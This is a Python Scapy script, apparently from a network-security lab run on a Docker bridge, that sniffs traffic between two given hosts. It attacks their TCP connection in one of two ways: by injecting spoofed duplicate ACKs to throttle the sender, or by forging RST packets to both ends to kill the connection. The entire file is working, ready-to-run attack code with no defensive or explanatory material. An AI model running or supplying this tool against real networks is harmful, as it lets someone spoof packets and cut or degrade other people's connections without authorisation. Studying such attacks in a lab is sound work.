import sys
from scapy.all import sniff, IP, TCP, send, sendp, Ether

INTERFACE = "docker0" 
# 

def throttle_transmission(source_ip, dest_ip, verbose=True):
    throttle_rate = int(input("Input throttle rate (how many packets between each DupAck) [2]: ")) or 2
    pkt_count = [0]
    def prn_throttle(pkt):
        if pkt.haslayer(TCP):
            # Check for temination
            if pkt[TCP].flags == 'F' or pkt[TCP].flags == 'R':
                print("Termination signal seen! Stopping...")
                return True


            pkt_count[0] += 1
            if pkt_count[0] % throttle_rate == 0:
                src_port = pkt[TCP].sport
                dest_port = pkt[TCP].dport
                target_ack = pkt[TCP].ack
                seq_num = pkt[TCP].seq

                eth = Ether(dst=pkt[Ether].src) 

                dup_ack = eth / IP(src=dest_ip, dst=source_ip) / TCP(sport=src_port, dport=dest_port, flags='A', seq=seq_num, ack=target_ack)
                for _ in range(3):
                    sendp([dup_ack], verbose=False)
                if verbose: print("Sent 3 DupAck")

            else:
                if verbose: print(f"Allowing packet {pkt_count} through")

    # We need to send the ACKs from the DEST to the SRC
    sniff(iface=INTERFACE, filter=f"tcp and src host {dest_ip} and dst host {source_ip}", prn=prn_throttle)


def kill_transmission(source_ip, dest_ip):
    def prn_kill(pkt):
        if pkt.haslayer(TCP):
            src_port = pkt[TCP].sport
            dst_port = pkt[TCP].dport
            # We capture from source-> dest. To kill this we need to pretend to be the source
            # Thus the ack is what the source expects to receive next
            seq_nr = pkt[TCP].ack

            # Construct the Ethernet layer to avoid the "Broadcast" warning
            # Maybe remove?
            eth = Ether(dst=pkt[Ether].src) 

            # Kill src and dst
            rst_to_src = eth / IP(src=dest_ip, dst=source_ip) / TCP(sport=dst_port, dport=src_port, seq=seq_nr, flags='R')
            rst_to_dst = eth / IP(src=source_ip, dst=dest_ip) / TCP(sport=src_port, dport=dst_port, seq=seq_nr, flags='R')

            # Use sendp() for Layer 2 (Ethernet) packets
            sendp([rst_to_src, rst_to_dst], verbose=False)
            print(f"Sent RST pair to source and destination")

    sniff(iface=INTERFACE, filter=f"tcp and src host {source_ip} and dst host {dest_ip}", prn=prn_kill, count=10)


if __name__ == "__main__":
    if len(sys.argv) != 4 or sys.argv[3] not in ['throttle', 'kill']:
        print(f"Usage: {sys.argv[0]} <source IP> <dest IP> <throttle/kill>")
        exit(1)
    source, dest, option = sys.argv[1], sys.argv[2],sys.argv[3]
    if option == 'throttle':
        throttle_transmission(source, dest)
    else:
        kill_transmission(source, dest)
